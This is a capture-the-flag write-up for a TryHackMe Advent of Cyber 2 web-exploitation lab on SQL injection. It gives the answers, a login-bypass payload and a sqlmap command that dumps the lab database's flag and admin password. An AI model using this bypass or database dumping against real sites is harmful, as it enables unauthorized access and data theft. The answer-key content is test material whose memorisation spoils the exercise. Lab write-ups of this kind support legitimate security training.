# TRYHACKME: ADVENTOFCYBER2 [DAY 5] WEB EXPLOITATION - Someone stole Santa's gift list!

```
After last year's attack, Santa and the security team have worked hard on reviving Santa's personal portal. Hence, 'Santa's forum 2' went live.

After the attack, logs have revealed that someone has found Santa's panel on the website and logged into his account! After doing so, they were able to dump the whole gift list database, getting all the 2020 gifts in their hands. An attacker has threatened to publish a wishlist.txt file, containing all information, but happily, for us, he was caught by the CBI (Christmas Bureau of Investigation) before that. On MACHINE_IP:8000 you'll find the copy of the website and your goal is to replicate the attacker's actions by dumping the gift list!
```

TOPICS: SQL Injection, sqlmap

### QUESTIONS

Without using directory brute forcing, what's Santa's secret login panel?

```
/santapanel
```

Visit Santa's secret login panel and bypass the login using SQLi

```
' or true; --
```

How many entries are there in the gift database?

```
--'

22
```

What did Paul ask for?

```
github_ownership
```

What is the flag?

```
sqlmap -r burpsuite.repeater.txt --tamper=space2comment --dbms=SQLite --dump-allo

+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All_I_Want_for_Christmas_Is_You} |
+-----------------------------------------+
```

What is admin's password?

```
sqlmap -r burpsuite.repeater.txt --tamper=space2comment --dbms=SQLite --dump-allo

+------------------+----------+
| password         | username |
+------------------+----------+
| EhCNSWzzFP6sc7gB | admin    |
+------------------+----------+
```
